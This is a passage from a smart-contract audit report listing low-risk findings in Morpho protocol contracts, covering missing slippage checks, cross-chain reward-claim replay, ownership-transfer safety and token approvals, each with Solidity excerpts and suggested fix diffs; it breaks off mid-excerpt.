[StEthBundler.wrapStEth function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L60C1-L66C6)

```solidity
    function wrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).wrap(amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

- Update the `StEthBundler.wrapStEth` function to check for minimum wstETHAmount/slippage protection:

```diff
-   function wrapStEth(uint256 amount) external payable protected {
+   function wrapStEth(uint256 amount,uint256 minWstETH) external payable protected {
        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

-       IWstEth(WST_ETH).wrap(amount);
+       uint256 receivedWstETH = IWstEth(WST_ETH).wrap(amount);
+       require(receivedWstETH >= minWstETH, "insufficient received amount");
    }
```



### `StEthBundler.unwrapStEth` function lacks slippage protection	_(duplicate of [StEthBundler doesn't check for slippage checks when wrapping/unwrapping StEth])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `StEthBundler.unwrapStEth` function is intended to unwrap the given `amount` of wstETH to stETH.

- The caller must have previously transferred their wstETH tokens to the bundler, and this transferred value must be equal to the `amount` argument, then the function calls `IWstEth(WST_ETH).unwrap(amount)` for the operation; and this call returns the amount of stETH received after the unwrap:

- The same issue is spotted in `StEthBundler.unwrapStEth` where users asks to unwrap a given `amount` of wstETH to stETH, and the function calls `IWstEth(WST_ETH).unwrap(amount)` [as per WstEth.unwrap function](https://github.com/lidofinance/lido-dao/blob/cadffa46a2b8ed6cfa1127fca2468bae1a82d6bf/contracts/0.6.12/WstETH.sol#L69C1-L75C6):

  ```solidity
      function unwrap(uint256 _wstETHAmount) external returns (uint256) {
          require(_wstETHAmount > 0, "wstETH: zero amount unwrap not allowed");
          uint256 stETHAmount = stETH.getPooledEthByShares(_wstETHAmount);
          _burn(msg.sender, _wstETHAmount);
          stETH.transfer(msg.sender, stETHAmount);
          return stETHAmount;
      }
  ```

- But this returned value is not checked against any minimum value determined by the user; the function lacks slippage protection.

- Impact

Users might receive stETH amounts less than a minimum amount they intend to have.

- Proof of Concept

[StEthBundler.unwrapStEth function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L72C1-L78C6)

```solidity
    function unwrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).unwrap(amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

- Update the `StEthBundler.unwrapStEth` function to check for minimum wstETHAmount/slippage protection:

```diff
-   function unwrapStEth(uint256 amount) external payable protected {
+   function unwrapStEth(uint256 amount,uint256 minStETH) external payable protected {
        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

-       IWstEth(WST_ETH).unwrap(amount);
+       uint256 receivedStETH = IWstEth(WST_ETH).unwrap(amount);
+       require(receivedStETH >= minStETH, "insufficient received amount");
    }
```



### `UniversalRewardsDistributor.claim` function: users can claim rewards with the same proof on different chains

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- The protocol is intended to be deployed on the mainnet during its first stage; then later in the future it will be deployed on multiple chains.

- The current design of the `claim` function requires users to provide the proof, and this and leaf (`account` address, `reward` token address and `claimable` reward amount) and the proof and leaf is checked if it's valid with `root`:

  ```solidity
          require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
          require(
              MerkleProof.verifyCalldata(
                  proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
              ),
              ErrorsLib.INVALID_PROOF_OR_EXPIRED
          );

  ```

- As can be noticed; the leaf calculation doesn't have any indication on the current chainId, which makes it possible for users to claim rewards more than once on different chains if the owner has set similar `root` for the same distribution on different chains.

- Context

[UniversalRewardsDistributor.claim function](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L115C1-L136C6)

```solidity
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
    }
```

- Recommendation

Include `block.chainid` in `root` calculation, and update the leaf to include `block.chainid` as well:

```diff
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
-       require(
-           MerkleProof.verifyCalldata(
-               proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
-           ),
-           ErrorsLib.INVALID_PROOF_OR_EXPIRED
-       );


+       require(
+           MerkleProof.verifyCalldata(
+               proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable,block.chainid))))
+           ),
+           ErrorsLib.INVALID_PROOF_OR_EXPIRED
+       );
     //some code...
    }
```



### `UniversalRewardsDistributor` contract is missing two-step ownership when transferring ownership	_(duplicate of [UniversalRewardsDi.stributor.setOwner() fails to use a two-step procedure to change the ownership.])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- The owner of `UniversalRewardsDistributor` contract can transfer the ownership of the contract to any address via calling `UniversalRewardsDistributor.setOwner`, and this function directly sets the ownership to the newOwner.

- But if the newOwner is an invalid/inactive/uncontrolled account; then all the owner privileged functionalities will be broken (such as `setTimelock`, `setRootUpdater` & `setOwner` functions) rendering the rewards contract in an usable state as the the distributions will be blocked since the owner can't set the distribution `root`.

- Context

[UniversalRewardsDistributor.setOwner function](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172C1-L176C6)

```solidity
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, ErrorsLib.ALREADY_SET);

        _setOwner(newOwner);
    }
```

- Recommendation

- Consider implementing a two step process when transferring ownership:

1. By updating `setOwner` function to set `pendingOwner`:

   ```diff
   -   function setOwner(address newOwner) external onlyOwner {
   -       require(newOwner != owner, ErrorsLib.ALREADY_SET);

   -       _setOwner(newOwner);


   +   function setOwner(address _pendingOwner) external onlyOwner {
   +       require(_pendingOwner != owner, ErrorsLib.ALREADY_SET);

   +       pendingOwner = _pendingOwner;
       }
   ```

2. And introduce a new function (`acceptOwnership`) that transfers the ownership to the pendingOwner (so that it's ensured that the ownership is transferred to an active/valid account):

   ```diff
   +   function acceptOwnership() external {
   +       require(pendingOwner == msg.sender, ErrorsLib.ALREADY_SET);

   +       _setOwner(pendingOwner);

   +   }
   ```

#

- [L-03] `ChainlinkDataFeedLib.getPrice` may provide inaccurate asset price when the underlying asset hits the minimum price

- Details

- `ChainlinkDataFeedLib` uses chainlink feed aggregators to extract the price of the requested token.

- Chainlink aggregators implements a built-in circuit breaker mechanism that is activated when the price of a token deviates beyond a pre-defined price range.

- So if the token value is decreased substantially; the aggregator will return the minimum price/stale price instead of the actual token price.

- [Similar issue reported for LUNA token crash](https://cointelegraph.com/news/defi-protocols-declare-losses-as-attackers-exploit-luna-price-feed-discrepancy).

- Context

[ChainlinkDataFeedLib.getPrice function](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20C1-L27C6)

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

- Recommendation

Check the returned asset price against a pre-defined minimum/maximum price before consuming it.



###  `ChainlinkDataFeedLib.getPrice` may provide inaccurate asset price when the underlying asset hits the minimum price	_(duplicate of [Relying on the Chainlink feeds keeping its promises can result in massive loss of funds for user ])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `ChainlinkDataFeedLib` uses chainlink feed aggregators to extract the price of the requested token.

- Chainlink aggregators implements a built-in circuit breaker mechanism that is activated when the price of a token deviates beyond a pre-defined price range.

- So if the token value is decreased substantially; the aggregator will return the minimum price/stale price instead of the actual token price.

- [Similar issue reported for LUNA token crash](https://cointelegraph.com/news/defi-protocols-declare-losses-as-attackers-exploit-luna-price-feed-discrepancy).

- Context

[ChainlinkDataFeedLib.getPrice function](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20C1-L27C6)

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

- Recommendation

Check the returned asset price against a pre-defined minimum/maximum price before consuming it.



### `MetaMorpho` contract: some tokens don't set approval to `type(uint256).max`	_(duplicate of [Some tokens would be reverted in the MetaMorpho#`constructor()` - due to being always forced to approve with `type(uint256).max`])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- In `MetaMorpho` contract: the `MORPHO` address is approved on the vault's underlying asset for depositing operations, and it's set in the constructor upon vault deployment to be `type(uint256).max` :

  ```solidity
  IERC20(_asset).forceApprove(morpho, type(uint256).max);
  ```

- But some tokens limits the maximum approval to `type(uint96).max` only, such as UNI token:
  [see here](https://etherscan.io/token/0x1f9840a85d5af5bf1d1762f925bdaddc4201f984#code#L343)

  ```solidity
      function approve(address spender, uint rawAmount) external returns (bool) {
          uint96 amount;
          if (rawAmount == uint(-1)) {
              amount = uint96(-1);
          } else {
              amount = safe96(rawAmount, "Uni::approve: amount exceeds 96 bits");
          }

          allowances[msg.sender][spender] = amount;

          emit Approval(msg.sender, spender, amount);
          return true;
      }
  ```

- Since vaults can be created with any underlying asset; such tokens can limit the deposit of the vault to `type(uint96).max` instead of `type(uint265).max`.

- Context

[MetaMorpho.constructor](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L133C9-L133C64)

```solidity
IERC20(_asset).forceApprove(morpho, type(uint256).max);
```

- Recommendation

Approve the `MORPHO` contract on the deposited amount before each deposit/mint instead of setting the maximum approval in the constructor:

```diff
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares);
+       IERC20(asset()).forceApprove(address(MORPHO), 0);
+       IERC20(asset()).forceApprove(address(MORPHO),assets);
        _supplyMorpho(assets);

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets);
    }
```



### `MetaMorpho` vault owner can renounce ownership

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MetaMorpho` contract inherits openzeppelin `Ownable2Step` contract; which has `renounceOwnership` function that is accessed by the owner and transfers the ownership of the contract to `address(0)`.

- Renouncing `MetaMorpho` vault ownership will render the contract in a dangerous state as some vital controlling and management functionalities will be inaccessible if the ownership is renounced (`setCurator`, `setIsAllocator`, `setSkimRecipient`, `submitTimelock`, `setFee`, `setFeeRecipient` & `submitGuardian` functions will not be accessible anymore after renouncing ownership).

- Context

`O.Z Ownable.renounceOwnership inherited function: `

```solidity
   function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
```

- Recommendation

In `MetaMorpho` contract; disable `renounceOwnership()` function:

```diff
+  function renounceOwnership() public override(Ownable) onlyOwner {
+       revert("not allowed to renounce ownership");
+   }
```



### `MetaMorpho` contract doesn't work with fee-on-transfer tokens	_(duplicate of [MetaMorpho doesn't support fee on transfer tokens])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MetaMorpho` vault can be deployed with any underlying asset, and fee on transfer tokens can be used as an underlying asset in both `MORPHO` markets and `MetaMorpho` vaults as there's no whitlisting on which tokens to be used in th protocol markets and vaults.

- Fee on transfer tokens deducts a fee from the transferred token amount; so that the token receiver will receive `amount - fee`.

- But vaults deployed with such token type as an underlying asset will not work when users try to deposit their assets via `deposit` function:
  1.  a depositor calls `MetaMorpho.deposit` function with `assets` amount (the vault has an underlying asset of fee-on-transfer type).
  2.  These `assets` are going to be transferred first from the depositor to the vault (`super._deposit`),and the vault balance will be < `assets` due to the deducted fee.
  3.  Then the vault tries to deposit this `assets` amount via `_supplyMorpho(assets)` function; but the function will revert as the total balance of the vault is less than the `assets` that the vault tries to supply for the `MORPHO` markets.

- Context

[MetaMorpho.\_deposit function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695C1-L702C6)

```solidity
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares);

        _supplyMorpho(assets);

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets);
    }
```

- Recommendation

Either implement a mechanism to handle this type of tokens or prevent using it in morpho markets and metaMorpho vaults (by allowing a whitlisted tokens only).




### Migration Bundlers missing checking returned values of the calls (slippage check)

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- Migration bundlers are contracts that are designed to enable users to migrate their positions from AaveV3 Optimizer, AaveV3, AaveV2, CompoundV3, and CompoundV2 to Morpho Blue protocol, these contracts are:

  - `AaveV2MigrationBundler`
  - `AaveV3MigrationBundler`
  - `AaveV3OptimizerMigrationBundler`
  - `CompoundV2MigrationBundler`
  - `CompoundV3MigrationBundler`

- These bundlers have a repay function to enable users from repaying their debt positions on any of the aformentioned protocols, let's see `AaveV2MigrationBundler.aaveV2Repay` [function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L37C1-L50C6):

  ```solidity
      /// @notice Repays `amount` of `asset` on AaveV2, on behalf of the initiator.
      /// @dev Initiator must have previously transferred their assets to the bundler.
      /// @param asset The address of the token to repay.
      /// @param amount The amount of `asset` to repay. Pass `type(uint256).max` to repay the bundler's `asset` balance.
      /// @param interestRateMode The interest rate mode of the position.
      function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
          if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));

          require(amount != 0, ErrorsLib.ZERO_AMOUNT);

          _approveMaxTo(asset, address(AAVE_V2_POOL));

          AAVE_V2_POOL.repay(asset, amount, interestRateMode, initiator());
      }
  ```

- So in order for a caller to repay on AAVE, he must first transfer his asset to the bundler to be repaid to AAVE, then the `AaveV2MigrationBundler.aaveV2Repay` function calls ` AAVE_V2_POOL.repay(asset, amount, interestRateMode, initiator())`, and this call returns the amount of repaid asset, as can be seen from [AAVE::LendingPool.repay](https://github.com/aave/protocol-v2/blob/ce53c4a8c8620125063168620eba0a8a92854eb8/contracts/protocol/lendingpool/LendingPool.sol#L234C1-L241C56):

  ```solidity
  * @return The final amount repaid
  **/
  function repay(
      address asset,
      uint256 amount,
      uint256 rateMode,
      address onBehalfOf
  ) external override whenNotPaused returns (uint256) {
  ```

- But this mechanism introduces two vulnerabilities:

  1.  The value of the repaid assets returned when calling ` AAVE_V2_POOL.repay` is not cached and checked against a minimum value (`aaveV2Repay` function lacks slippage protection/the issue is clearer in the `aaveV2Withdraw` function).
  2.  Also if the asset is not fully repaid; then the excess tokens that were sent by the caller to the bundler contract before the call must be refunded back to the caller.

- The same issue is present in the `AaveV2MigrationBundler.aaveV2Withdraw`; where the returned withdrawn asset value is not checked, and the caller is not refunded any extra aTokens not utilized in the operation (as the caller must send his aTokens to the bundler before withdrawing from AAVE).

- The two vulnerabilities explained above for `AaveV2MigrationBundler` contract functions are also present in the following bundler contracts functions:

  - `AaveV3MigrationBundler.aaveV3Repay` & `AaveV3MigrationBundler.aaveV3Withdraw` functions.
  - `AaveV3OptimizerMigrationBundler.aaveV3OptimizerRepay` & `AaveV3OptimizerMigrationBundler.aaveV3OptimizerWithdraw` functions.
  - `CompoundV2MigrationBundler.compoundV2Repay` & `CompoundV2MigrationBundler.compoundV2Redeem` functions.
  - `CompoundV3MigrationBundler.compoundV3Repay` & `CompoundV3MigrationBundler.compoundV3WithdrawFrom` functions.

- So users might lose their unwithdrawn assets when they transfer their receipt tokens/asset to the bundler and the full amount wasn't withdrawn/repaid and might not getting an adequate amount of assets when withdrawing due to slippage.

- Context

[AaveV2MigrationBundler.aaveV2Repay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L42C4-L42C111)

```solidity
 function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
```

[AaveV2MigrationBundler.aaveV2Withdraw function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L57C5-L57C88)

```solidity
function aaveV2Withdraw(address asset, uint256 amount) external payable protected {
```

[AaveV3MigrationBundler.aaveV3Repay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L39C3-L39C111)

```solidity
  function aaveV3Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
```

[AaveV3MigrationBundler.aaveV3Withdraw function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L54C5-L54C88)

```solidity
function aaveV3Withdraw(address asset, uint256 amount) external payable protected {
```

[AaveV3OptimizerMigrationBundler.aaveV3OptimizerRepay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3OptimizerMigrationBundler.sol#L39C5-L39C99)

```solidity
function aaveV3OptimizerRepay(address underlying, uint256 amount) external payable protected {s
```

[AaveV3OptimizerMigrationBundler.aaveV3OptimizerWithdraw function]https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3OptimizerMigrationBundler.sol#L56C5-L56C96)

```solidity
function aaveV3OptimizerWithdraw(address underlying, uint256 amount, uint256 maxIterations)
```

[CompoundV2MigrationBundler.compoundV2Repay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L41C5-L41C90)

```solidity
function compoundV2Repay(address cToken, uint256 amount) external payable protected {
```

[CompoundV2MigrationBundler.compoundV2Redeem function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L67C5-L67C91)

```solidity
function compoundV2Redeem(address cToken, uint256 amount) external payable protected {
```

[CompoundV3MigrationBundler.compoundV3Repay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L28C5-L28C92)

```solidity
function compoundV3Repay(address instance, uint256 amount) external payable protected {
```

[CompoundV3MigrationBundler.compoundV3WithdrawFrom function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L50C5-L50C114)

```solidity
function compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {
```

- Recommendation

Implement slippage protection in these functions and refund the excess tokens/receipt tokens (that were sent to the bundler before the operation) to the caller.




### `BaseBundler._approveMaxTo` function doesn't set maximum approval for some tokens like UNI token

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `BaseBundler._approveMaxTo` function is inherited by multiple bundlers to grant a 3rd-party that the bundler interacting with a maximum approval for it's token balance.

- This function sets the spender allowance to `type(uint256).max`; but some tokens limits the maximum approval to `type(uint96).max` only, such as UNI token:
  [see here](https://etherscan.io/token/0x1f9840a85d5af5bf1d1762f925bdaddc4201f984#code#L343)

  ```solidity
      function approve(address spender, uint rawAmount) external returns (bool) {
          uint96 amount;
          if (rawAmount == uint(-1)) {
              amount = uint96(-1);
          } else {
              amount = safe96(rawAmount, "Uni::approve: amount exceeds 96 bits");
          }

          allowances[msg.sender][spender] = amount;

          emit Approval(msg.sender, spender, amount);
          return true;
      }
  ```

- Since users can interact with any pool or vault with any asset; such tokens can limit the deposit/transfer into other vaults/pools to `type(uint96).max` instead of `type(uint265).max`.

- Context

[BaseBundler.\_approveMaxTo function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L93C1-L97C6)

```solidity
    function _approveMaxTo(address asset, address spender) internal {
        if (ERC20(asset).allowance(address(this), spender) == 0) {
            ERC20(asset).safeApprove(spender, type(uint256).max);
        }
    }
```

- Recommendation

Update `_approveMaxTo` function to set the approval for a spender by the appropriate amount instead of setting allowance to `type(uint265).max`:

```diff
-function _approveMaxTo(address asset, address spender) internal {
-   if (ERC20(asset).allowance(address(this), spender) == 0) {
-           ERC20(asset).safeApprove(spender, type(uint256).max);
-   }
+function _approveMaxTo(address asset, address spender,uint256 amount) internal {
+       ERC20(asset).safeApprove(spender, 0);
+       ERC20(asset).safeApprove(spender, amount);
}
```




### `ERC46626Bundler` functions don't refund user extra share/assets

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `ERC46626Bundler` contract manages interactions with ERC4626 compliant tokens (vaults).

- When a user wants to deposit in a vault; he must first transfer the vault's underlying asset to the bundler, then calls `ERC46626Bundler.erc4626Deposit`:

  > /// @notice Deposits the given amount of `assets` on the given ERC4626 `vault`, on behalf of `receiver`.
  >
  > /// @dev Initiator must have previously transferred their assets to the bundler.

- Then this function deposits the assets in the intended vault and receives a share amount that is checked for slippage against `minShare`.

- Since `ERC46626Bundler` is supposed to interact with different ERC4626 vaults and not limited to interact with `MetaMorpho` vaults; there must be a check that the total sent `assets` is deposited in the vault and there's nothing left in the bundler, as there are some vaults that are designed to deposit part of the asset if these vaults reached their deposit capacity instead of reverting.

- Similar issue with `ERC46626Bundler.erc4626Mint` function.

- And when a user wants to withdraw his asset from a vault; he must first transfer the vault's share token to the bundler, then calls `ERC46626Bundler.erc4626Withdraw` where it will withdraw the assets from the vault:

  > /// If `owner` is the initiator, they must have previously approved the bundler to spend their vault shares.
  >
  > /// Otherwise, they must have previously transferred their vault shares to the bundler.

- Since `ERC46626Bundler` is supposed to interact with different ERC4626 vaults and not limited to interact with `MetaMorpho` vaults; there must be a check that the total withdrawn `assets` is equal to the `assets` argument sent by the user and there's nothing left in the bundler, as there are some vaults that are designed to withdraw part of the asset if they have low liquidity instead of reverting.

- Similar issue with `ERC46626Bundler.erc4626Redeem` function.

- Context

[ERC4626Bundler.erc4626Mint function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L28C5-L32C6)

```solidity
function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver)
        external
        payable
        protected
    {
```

[ERC4626Bundler.erc4626Deposit function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53C3-L57C6)

```solidity
  function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver)
        external
        payable
        protected
    {
```

[ERC4626Bundler.erc4626Withdraw function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L84C1-L88C6)

```solidity
    function erc4626Withdraw(address vault, uint256 assets, uint256 maxShares, address receiver, address owner)
        external
        payable
        protected
    {
```

[ERC4626Bundler.erc4626Redeem function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L110C2-L114C6)

```solidity
   function erc4626Redeem(address vault, uint256 shares, uint256 minAssets, address receiver, address owner)
        external
        payable
        protected
    {
```

- Recommendation

- Either check the bundler balance of the underlying vault's asset (or share token) before and after the deposit/mint or withdraw/redeem; and refund the residual to the user if any left.

- Or allow `ERC4626Bundler` contract from interacting with vaults that have been created via `MetaMorphoFactory` only.




### Bundlers grant external protocols/contracts infinite approval on their underlying tokens	_(duplicate of [Functions that call _approveMaxTo can be abused to steal token balances of bundlers])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

Some bundler contracts grant infinite approval to external contracts and vaults for their underlying asset upon depositing/minting, and this can introduce some issues to the bundlers if any of these contracts that the bundlers approved to max got compromised, rendering the bundlers balances of these assets at risk.

- Proof of Concept

[BaseBundler.\_approveMaxTo function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L93C1-L97C6)

```solidity
    function _approveMaxTo(address asset, address spender) internal {
        if (ERC20(asset).allowance(address(this), spender) == 0) {
            ERC20(asset).safeApprove(spender, type(uint256).max);
        }
    }
```

[ERC20WrapperBundler.erc20WrapperDepositFor function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC20WrapperBundler.sol#L37C9-L37C53)

```solidity
_approveMaxTo(address(underlying), wrapper);
```

[ERC4626Bundler.erc4626Mint function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L40C9-L40C55)

```solidity
_approveMaxTo(IERC4626(vault).asset(), vault);
```

[MorphoBundler.morphoSupply function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L105C9-L105C64)

```solidity
_approveMaxTo(marketParams.loanToken, address(MORPHO));
```

[MorphoBundler.morphoSupplyCollateral function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L133C9-L133C70)

```solidity
_approveMaxTo(marketParams.collateralToken, address(MORPHO));
```

[MorphoBundler.morphoRepay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L189C9-L189C64)

```solidity
_approveMaxTo(marketParams.loanToken, address(MORPHO));s
```

[MorphoBundler.morphoLiquidate function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L252C9-L252C64)

```solidity
_approveMaxTo(marketParams.loanToken, address(MORPHO));
```

[MorphoBundler.morphoFlashLoan function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L264C9-L264C47)

```solidity
_approveMaxTo(token, address(MORPHO));
```

- Recommendation

Update `_approveMaxTo` function to set the approval for a spender by the appropriate amount instead of setting allowance to `type(uint265).max`:

```diff
-function _approveMaxTo(address asset, address spender) internal {
-   if (ERC20(asset).allowance(address(this), spender) == 0) {
-           ERC20(asset).safeApprove(spender, type(uint256).max);
-   }
+function _approveMaxTo(address asset, address spender,uint256 amount) internal {
+       ERC20(asset).safeApprove(spender, 0);
+       ERC20(asset).safeApprove(spender, amount);
}
```




### `reallocate` should trigger `_accrueFee`, otherwise fee recipient could loss the deserved fee

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L397-L397](metamorpho/src/MetaMorpho.sol#L397-L397)

**Description**:

`reallocate` is a function that allow allocator, curator and admin to withdraw vault's assets from markets and deposit to other markets, according to the strategy and assets allocation.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397-L446

```solidity
    function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
        uint256 totalSupplied;
        uint256 totalWithdrawn;
        for (uint256 i; i < allocations.length; ++i) {
            MarketAllocation memory allocation = allocations[i];
            Id id = allocation.marketParams.id();

            (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
            uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);

            if (withdrawn > 0) {
                if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);

                // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
                uint256 shares;
                if (allocation.assets == 0) {
                    shares = supplyShares;
                    withdrawn = 0;
                }

                (uint256 withdrawnAssets, uint256 withdrawnShares) =
                    MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

                emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

                totalWithdrawn += withdrawnAssets;
            } else {
                uint256 suppliedAssets = allocation.assets == type(uint256).max
                    ? totalWithdrawn.zeroFloorSub(totalSupplied)
                    : allocation.assets.zeroFloorSub(supplyAssets);
